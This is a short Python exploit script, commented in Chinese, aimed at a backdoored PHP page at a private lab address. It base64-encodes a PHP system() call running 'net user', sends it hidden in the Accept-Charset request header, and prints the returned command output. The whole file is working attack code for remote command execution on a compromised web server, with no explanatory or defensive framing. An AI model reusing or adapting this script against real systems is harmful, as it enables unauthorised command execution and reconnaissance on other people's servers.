import requests
import base64

#后门文件的url
url="http://192.168.200.148/1.php"

#创建cmd命令，并加密成base64
cmd="net user"
cmd=f"""system("{cmd}");"""
cmd=base64.b64encode(cmd.encode()).decode()


#创建请求头部S
headers={
    "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept-Encoding":  "gzip,deflate",
    "Accept-Charset":   f"{cmd}"
}


#创建请求
res=requests.get(  url=url,  headers = headers)
html=res.content.decode("GBK")
html=html[0:html.find("<!DOCTYPE")]
print(html)